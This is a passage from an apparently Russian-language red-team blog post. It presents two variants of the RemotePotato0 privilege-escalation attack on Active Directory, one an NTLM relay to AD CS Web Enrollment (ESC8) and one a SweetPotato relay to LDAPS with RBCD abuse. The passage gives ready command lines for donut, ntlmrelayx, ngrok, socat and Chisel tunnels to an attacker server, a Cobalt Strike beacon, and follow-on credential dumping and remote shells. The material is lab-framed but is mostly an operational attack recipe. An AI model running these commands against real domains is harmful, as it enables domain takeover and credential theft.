И я снова энтерпрайз админ. Таким образом, мы скрафтили способ повышения привилегий с помощью RemotePotato0 без использования вспомогательного хоста на внутреннем периметре!

# Бонус № 1. Релей на AD CS (ESC8)

В случае, если по какой-либо причине релеить на LDAP(S) не получается, но в домене есть незащищенный эндпоинт Web Enrollment центра сертификации AD CS, можно провернуть вариацию атаки ESC8 (смотрим ресерч [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) за подробностями).

Для того, чтобы релей сработал в этом случае, может потребоваться поиграть с разными значениями CLSID, которые можно указать через аргумент `-c`. Захардкоженное значение `{5167B42F-C111-47A1-ACC4-8EABE61B0B54}` не сработает из-за того, что разные службы (с разными CLSID) используют разные [уровни аутентификации](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/a83205a2-23e2-41bb-84e1-4d968aaae4e8#gt_bfb9708e-9d05-4f79-8969-ef63f73aa434) при их триггере по RPC (определяется значением [этих констант](https://docs.microsoft.com/en-us/windows/win32/rpc/authentication-service-constants)). То, что работает при релее на LDAP, может не сработать при релее на SMB / HTTP (в случае ESC8 релеим именно на HTTP).

Так вот, опять же империческим путем выяснено, что для ESC8 подходит служба **CastServerInteractiveUser** со значением CLSID `{f8842f8e-dafe-4b37-9d38-4e0714a61149}`.

Продемонстрировать со скриншотом, к сожалению, не получится, т. к. в моей лаба сервер TEXAS и выполняет роль AD CS, а reflective-релей с самого себе не сработает.

[![Вот вам пруф](/assets/images/remote-potato-0/adcs-server.png)](/assets/images/remote-potato-0/adcs-server.png)
{:.center-image}

Вот вам пруф
{:.quote}

Но в командах это должно было бы выглядеть примерно так.

```
~$ ./donut -i RemotePotato0.exe -b=1 -t -p '-m 0 -r <ATTACKER_IP> -x <ATTACKER_IP> -p 9998 -s <SESSION_ID> -c {f8842f8e-dafe-4b37-9d38-4e0714a61149}' -o RemotePotato0.bin
~$ ntlmrelayx.py -t http://<ADCS_CA_IP>/certsrv/certfnsh.asp --no-smb-server --no-wcf-server --no-raw-server --adcs --template User
```

При успешной генерации сертификата от имени атакованного пользюка, далее действуем обычно, как это происходит после проведение ESC8-атаки, а именно пользуемся «[Рубевусом](https://github.com/GhostPack/Rubeus#asktgt)» (флаг `/getcredentials`) или [PKINITtools](https://github.com/dirkjanm/PKINITtools) для получения TGT и/или NT-хеша жертвы.

# Бонус № 2. Remote Potato без RemotePotato0.exe

В репозитории Impacket ждет своего часа [pull request](https://github.com/SecureAuthCorp/impacket/pull/1299), избавляющий нас от необходимости тащить на атакуемый хост RemotePotato0.exe: триггер NTLM-аутентификации перенесли [в этот форк SweetPotato](https://github.com/MrAle98/SweetPotato), RPC-сервер реализовали в самом ntlmrelayx.py, а OXID-резолвер вынесли в отдельный скрипт rpcoxidresolver.py. Однако в этом случае самый вкусный функционал будет урезан – триггерить NTLM-аутентификацию можно только от имени машинной УЗ, но не сквозь чужую сессию.

Я покажу способ вооружить и этот вариант атаки, имея под рукой только бикон «кобы» и инстанс VDS, через классическую реализацию **RBCD-абьюза** для пывна сервера, откуда прилетает аутентификация.

Для этого сначала определимся, что, куда и зачем мы редиректим:

1. С помощью ngrok создаем TCP-канал извне до **localhost:135**. Так как RPC-сервер теперь крутится на машине атакующего, нам не нужно ничего зеркалить вторым socat – достаточно запустить rpcoxidresolver.py, который уже [слушает localhost:135](https://github.com/SecureAuthCorp/impacket/blob/9ac5e9efdf0dca58e56f62e6bd15d64ce772d2ca/examples/rpcoxidresolver.py#L131).
2. С помощью Chisel пробрасываем порт 9997 с VDS на порт 9998 машины атакующего, который слушает RPC-сервер ntlmrelayx.py. В качестве адреса RPC-сервера в rpcoxidresolver.py (опция `-rip`) указываем IP нашего VDS – это нужно для того, чтобы передать NTLM-аутентификацию в ntlmrelayx.py (при использовании адреса 127.0.0.1 эта конструкция работать отказывается).
3. ntlmrelayx.py пускаем через проксю CS для релея на службу LDAPS контроллера домена. Да, на LDAP**S**, потому что в результате релея мы хотим настроить делегирование относительно вспомогательной сервисной УЗ, которую нельзя создать по LDAP.
4. Стреляем SweetPotato.exe из CS с триггером CLSID `{42CBFAA7-A4A7-47BB-B422-BD10E9D02700}`, предлагаемого автором PR.

```
beacon(1)> socks 1080
(ATTACKER) ~$ ngrok tcp 135
(VDS) ~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<NGROK_IP>:<NGROK_PORT>
(VDS) ~$ sudo ./chisel server -p 6666 --reverse --auth <USER>:<PASS>
(ATTACKER) ~$ ./chisel client --auth <USER>:<PASS> <VDS_IP>:6666 R:9997:127.0.0.1:9998
(ATTACKER) ~$ python examples/rpcoxidresolver.py -oip 127.0.0.1 -rip <VDS_IP> -rport 9997
(ATTACKER) ~$ proxychains4 -q python examples/ntlmrelayx.py -t ldaps://<INTERNAL_DC_IP> --rpc-port 9998 -smb2support --no-smb-server --no-http-server --no-wcf-server --no-raw-server --no-da --no-acl --delegate-access
beacon(2)> execute-assembly SweetPotato.exe -e 1 -oip <VDS_IP> -c 42CBFAA7-A4A7-47BB-B422-BD10E9D02700
```

[![S4U2Proxy, я иду!](/assets/images/remote-potato-0/cs-sweetpotato-relay.png)](/assets/images/remote-potato-0/cs-sweetpotato-relay.png)
{:.center-image}

S4U2Proxy, я иду!
{:.quote}

После этого, полагаю, не нужно объяснять, что делать дальше.

Получаем TGS-билет через транзитные расширения Kerberos (S4U2Self & S4U2Proxy) с опцией олицетворения пользователя administrator ([getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py)) и фигачим [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) / [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py), чтобы извлечь секреты LSA или получить шелл на сервере.

[![Теперь мы законные админы на сервере TEXAS](/assets/images/remote-potato-0/rbcd-abuse.png)](/assets/images/remote-potato-0/rbcd-abuse.png)
{:.center-image}

Теперь мы законные админы на сервере TEXAS
{:.quote}

Прикольный вариант атаки, но протащить и выполнить оригинальный бинарь, как мы показали ранее, тоже не составляет большого труда.
